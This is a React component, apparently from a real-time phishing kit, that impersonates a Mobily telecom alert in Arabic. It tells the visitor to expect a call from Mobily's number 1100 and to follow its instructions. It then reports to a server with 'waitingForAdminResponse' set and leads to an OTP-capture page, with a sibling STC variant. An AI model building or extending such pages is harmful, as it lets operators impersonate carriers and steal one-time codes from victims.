import Button from "@mui/material/Button";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import "../stc-call-alert/CallAlert.css";
import { CircularProgress, createTheme, ThemeProvider } from "@mui/material";
import { adminLoading, loading } from "@/real-time/context/signals";

function MobilyCallAlert() {
  const submit = () => {
    sendDataToServer({
      data: { الحالة: "تم تلقي المكالة" },
      current: "تنبية إتصال Mobily",
      nextPage: `تحقق رقم الجوال (OTP)?serviceProvider=5`,
      waitingForAdminResponse: true,
    });
  };

  useEffect(() => setCurrentPage("تنبية إتصال Mobily"), []);

  const customTheme = createTheme({
    direction: "rtl",
    typography: {
      fontFamily: "Cairo, Roboto, sans-serif",
    },
    palette: {
      primary: {
        main: "#019cde",
      },
    },
  });

  return (
    <ThemeProvider theme={customTheme}>
      <section className="contact-alert absolute h-full w-full top-0 left-0 flex justify-between items-center gap-8 w-full bg-white py-12 px-2 sm:py-[8rem]">
        <img src="images/service-providers/6.png" className="w-[120px]" />

        <div className="text-center max-w-[300px] mx-auto">
          <h2 className="font-bold text-[#019cde] text-2xl mb-6">
            بانتظار تأكيد الجوال
          </h2>
          <img
            src="images/phone-ringing-old.gif"
            className="w-[100px] mx-auto"
          />
          <p
            className="mt-6 text-center font-bold"
            style={{ fontSize: "1.05rem" }}
          >
            سوف تصلك الان مكالمة من رقم موبايلي
            <span className="text-[#019cde]">1100</span> لتأكيد الطلب
          </p>
          <p
            className="mt-6 text-center text-[#019cde]"
            style={{ fontSize: "1.05rem" }}
          >
            يرجي اتباع التعليمات الموضحة في المكالمة
          </p>
        </div>

        <Stack className="form-bottom bottom-10 left-0 w-full px-4 max-w-[300px]">
          <Button
            fullWidth
            disabled={Boolean(loading.value || adminLoading.value)}
            variant="contained"
            onClick={submit}
          >
            {(loading.value || adminLoading.value) && <CircularProgress />}
            {!loading.value && !adminLoading.value && "تم تلقي المكالة "}
          </Button>
        </Stack>
      </section>
    </ThemeProvider>
  );
}

export default MobilyCallAlert;
